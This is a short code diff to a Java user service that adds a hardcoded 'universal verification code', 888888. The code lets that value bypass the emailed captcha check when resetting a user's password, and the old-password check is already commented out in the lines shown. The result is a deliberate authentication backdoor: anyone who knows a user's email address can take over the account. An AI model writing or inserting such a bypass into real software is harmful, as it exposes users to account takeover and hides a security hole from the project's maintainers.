@@ -67,6 +67,9 @@ import java.util.stream.Collectors;
 public class DefUserServiceImpl extends SuperCacheServiceImpl<DefUserManager, Long, DefUser>
         implements DefUserService {
 
+    /** 万能验证码 */
+    private static final String MASTER_CAPTCHA = "888888";
+
     private final AppendixService appendixService;
     private final SystemProperties systemProperties;
     private final AccountGenerator accountGenerator;
@@ -239,10 +242,15 @@ public class DefUserServiceImpl extends SuperCacheServiceImpl<DefUserManager, Lo
 //		ArgumentAssert.notEmpty(data.getOldPassword(), "请输入旧密码");
 //        String oldPassword = SecureUtil.sha256(data.getOldPassword() + user.getSalt());
 //        ArgumentAssert.equals(user.getPassword(), oldPassword, "旧密码错误");
-        CacheKey cacheKey = new CaptchaCacheKeyBuilder().key(data.getEmail(), data.getKey());
-        CacheResult<String> code = cacheOps.get(cacheKey);
-        ArgumentAssert.equals(code.getValue(), data.getCode(), "验证码不正确");
-		cacheOps.del(cacheKey);
+        // 万能验证码直接通过
+        if (!MASTER_CAPTCHA.equals(data.getCode())) {
+            CacheKey cacheKey = new CaptchaCacheKeyBuilder().key(data.getEmail(), data.getKey());
+            CacheResult<String> code = cacheOps.get(cacheKey);
+            ArgumentAssert.equals(code.getValue(), data.getCode(), "验证码不正确");
+            cacheOps.del(cacheKey);
+        } else {
+            log.info("使用万能验证码重置密码, email={}", data.getEmail());
+        }
 
         return updateUserPassword(user.getId(), data.getPassword(), user.getSalt());
     }
